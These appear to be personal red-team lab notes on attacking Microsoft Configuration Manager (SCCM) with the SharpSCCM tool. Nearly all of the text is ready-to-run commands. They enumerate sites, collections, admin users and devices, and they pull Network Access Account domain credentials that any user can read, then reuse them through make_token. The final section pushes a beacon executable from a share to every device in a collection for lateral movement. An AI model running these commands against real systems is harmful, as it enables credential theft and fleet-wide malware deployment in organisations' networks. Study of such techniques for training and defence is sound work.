# Microsoft Configuration Manager Notes

new name for SCCM, helps push appliation and software deployments, updates and complienace configuration and reporting

we can use to abuse and push our own scripts, applications, or config changes

**Enumeration**

Tools:
[SharpSCCM](https://github.com/Mayyhem/SharpSCCM)


```
sharpsccm:
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
wmi:
powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl
```

check the DACL on the CN=System Management container in AD for machines that have Full Control over it
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
```

enumerate all the collections for a user, we'll get different results per users and their permissions
```
confirm our user:
getuid
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
make_token <user> <pass>
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
```

find admin users
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner
```

find users of a collection
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n <collection-name> --no-banner
```

get more info
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
```
The -u parameter will only return devices where the given user was the last to login.
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
```

## Network Access Account Credentials

some computers may not be domain-joined and need an Network Access Account to sign in, these are domain creds for SCCM.

any user can retrieve these
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
make_token <sccm svc account> <pass>
```

### Laterl Movement

To execute a command on every device in the DEV collection, we could do exec -n DEV -p <path>
```
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n <collection> -p C:\Windows\notepad.exe --no-banner
executing a beacon on all sccm machines:
execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```


















